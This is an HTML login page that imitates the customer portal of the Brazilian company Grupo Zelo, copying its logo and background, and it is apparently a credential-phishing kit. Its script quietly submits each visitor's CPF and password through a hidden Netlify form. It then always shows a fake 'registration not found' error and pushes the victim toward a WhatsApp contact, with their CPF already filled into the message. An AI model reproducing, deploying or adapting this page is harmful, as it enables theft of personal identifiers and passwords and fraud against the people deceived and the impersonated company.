<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Grupo Zelo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-image: url('https://areadocliente.grupozelo.com/images/login_background.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }
        
        /* Overlay para melhorar legibilidade */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.3);
            z-index: 0;
        }
        
        .login-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 444px;
            padding: 40px 30px;
            position: relative;
            z-index: 1;
        }
        
        .logo {
            margin-bottom: 30px;
            text-align: center;
        }
        
        .logo img {
            max-width: 200px;
            height: auto;
            display: block;
            margin: 0 auto 15px auto;
        }
        
        .welcome-text {
            color: #8f8c8d;
            font-size: 14px;
            text-align: left;
            margin-left: 10px;
        }
        
        .welcome-text h2 {
            color: #2c3e50;
            font-size: 18px;
            margin-bottom: 5px;
            font-weight: 600;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #2c3e50;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        
        input:focus {
            border-color: #3498db;
            outline: none;
        }
        
        hr {
            border: none;
            height: 1px;
            background-color: #eee;
            margin: 25px 0;
        }
        
        .btn-login {
            background-color: #171695;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .btn-login:hover {
            background-color: #2980b9;
        }
        
        .links {
            text-align: center;
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
        }
        
        .links a {
            display: block;
            color: #171695;
            text-decoration: none;
            margin-bottom: 10px;
            font-weight: 500;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #7f8c8d;
            font-size: 12px;
        }
        
        /* Estilo para mensagem de erro */
        .error-message {
            background-color: #f8d7da;
            color: #721c24;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid #f5c6cb;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .whatsapp-button {
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.3s;
            display: none;
        }
        
        .whatsapp-button.show {
            display: flex;
        }
        
        .whatsapp-button:hover {
            background-color: #128C7E;
        }
        
        .whatsapp-icon {
            width: 20px;
            height: 20px;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://areadocliente.grupozelo.com/_next/image?url=%2Fimages%2Flogo-desktop.png&w=384&q=75" alt="Grupo Zelo">
            <div class="welcome-text">
                <h2>Log In</h2>
                <p>Faça o login para acessar sua conta</p>
            </div>
        </div>
        
        <div class="error-message" id="errorMessage">
            Cadastro não encontrado! Entre em contato com o atendimento.
        </div>
        
        <!-- Formulário principal para Netlify -->
        <form name="login-form" method="POST" netlify data-netlify="true" class="hidden">
            <input type="hidden" name="form-name" value="login-form">
            <input type="text" name="cpf" id="netlify-cpf">
            <input type="password" name="senha" id="netlify-senha">
            <button type="submit" id="netlify-submit">Enviar para Netlify</button>
        </form>
        
        <!-- Formulário visual para o usuário -->
        <div id="visual-form">
            <div class="form-group">
                <label for="cpf">CPF</label>
                <input type="text" id="cpf" placeholder="Digite seu CPF" required>
            </div>
            
            <div class="form-group">
                <label for="senha">Senha</label>
                <input type="password" id="senha" placeholder="Digite sua senha" required>
            </div>
            
            <hr>
            
            <button type="button" class="btn-login" id="btn-login">ENTRAR</button>
            
            <button type="button" class="whatsapp-button" id="whatsappButton">
                <svg class="whatsapp-icon" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893-.001-3.189-1.248-6.189-3.515-8.452"/>
                </svg>
                Falar com Atendimento
            </button>
            
            <div class="links">
                <a href="#">Crie uma conta</a>
                <a href="#">Esqueceu sua senha?</a>
            </div>
        </div>
        
        <div class="footer">
            &copy; 2025 Grupo Zelo - Todos os direitos reservados
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const btnLogin = document.getElementById('btn-login');
            const errorMessage = document.getElementById('errorMessage');
            const whatsappButton = document.getElementById('whatsappButton');
            const netlifyForm = document.querySelector('form[data-netlify="true"]');
            const netlifyCpf = document.getElementById('netlify-cpf');
            const netlifySenha = document.getElementById('netlify-senha');
            const netlifySubmit = document.getElementById('netlify-submit');
            
            // Função para validar CPF (formato básico)
            function validarCPF(cpf) {
                // Remove caracteres não numéricos
                cpf = cpf.replace(/\D/g, '');
                
                // Verifica se tem 11 dígitos
                if (cpf.length !== 11) {
                    return false;
                }
                
                // Verifica se não é uma sequência de números repetidos
                if (/^(\d)\1+$/.test(cpf)) {
                    return false;
                }
                
                // Aqui você pode adicionar validação mais robusta do CPF se necessário
                return true;
            }
            
            // Função para formatar CPF
            function formatarCPF(cpf) {
                cpf = cpf.replace(/\D/g, '');
                return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            }
            
            // Função para processar o login
            function processarLogin() {
                const cpf = document.getElementById('cpf').value;
                const senha = document.getElementById('senha').value;
                
                // Validação básica
                if (!cpf || !senha) {
                    alert('Por favor, preencha todos os campos.');
                    return;
                }
                
                if (!validarCPF(cpf)) {
                    alert('Por favor, insira um CPF válido.');
                    return;
                }
                
                // Primeiro, envia os dados para o Netlify
                netlifyCpf.value = cpf;
                netlifySenha.value = senha;
                netlifySubmit.click();
                
                // Simulação de verificação de credenciais
                // Em um sistema real, isso seria feito no servidor
                const credenciaisValidas = false; // Sempre retorna falso para demonstrar o erro
                
                if (!credenciaisValidas) {
                    // Mostra mensagem de erro
                    errorMessage.classList.add('show');
                    
                    // Mostra botão do WhatsApp
                    whatsappButton.classList.add('show');
                    
                    // Rola a página para mostrar a mensagem de erro
                    errorMessage.scrollIntoView({ behavior: 'smooth', block: 'center' });
                } else {
                    // Em caso de sucesso, redireciona para a área do cliente
                    window.location.href = '/area-do-cliente';
                }
            }
            
            // Evento de clique no botão de login
            btnLogin.addEventListener('click', processarLogin);
            
            // Evento do botão do WhatsApp
            whatsappButton.addEventListener('click', function() {
                const cpf = document.getElementById('cpf').value;
                redirecionarWhatsApp(cpf);
            });
            
            // Função para redirecionar para WhatsApp
            function redirecionarWhatsApp(cpf) {
                const telefone = '5531991748889'; // Número formatado para link internacional
                const mensagem = `Olá, preciso de ajuda! Meu CPF é ${formatarCPF(cpf)}.`;
                const url = `https://wa.me/${telefone}?text=${encodeURIComponent(mensagem)}`;
                window.open(url, '_blank');
            }
            
            // Máscara para CPF
            document.getElementById('cpf').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '');
                
                if (value.length <= 11) {
                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
                    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
                }
                
                e.target.value = value;
            });
            
            // Permitir envio com Enter em ambos os campos
            document.getElementById('cpf').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    processarLogin();
                }
            });
            
            document.getElementById('senha').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    processarLogin();
                }
            });
        });
    </script>
</body>
</html>
